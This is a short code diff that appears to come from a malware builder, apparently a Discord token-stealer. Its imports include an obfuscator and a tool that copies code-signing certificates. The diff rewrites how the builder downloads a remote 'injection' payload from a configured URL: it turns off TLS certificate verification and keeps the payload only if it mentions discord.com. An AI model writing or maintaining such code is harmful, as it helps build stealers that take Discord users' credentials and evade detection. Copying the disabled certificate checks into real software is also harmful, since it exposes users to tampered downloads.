@@ -5,7 +5,8 @@ import subprocess
 import random
 import string
 
-from urllib.request import urlopen
+from urllib3 import PoolManager, disable_warnings
+disable_warnings()
 import BlankOBF as obfuscator
 from sigthief import outputCert
 
@@ -75,7 +76,8 @@ def ReadSettings() -> tuple[dict, str]:
             settings = json.load(file)
 
     try:
-        injection = urlopen(InjectionURL, timeout= 5).read().decode().strip()
+        http = PoolManager(cert_reqs="CERT_NONE")
+        injection = http.request("GET", InjectionURL, timeout= 5).data.decode().strip()
         if not "discord.com" in injection:
             injection = None
     except Exception:
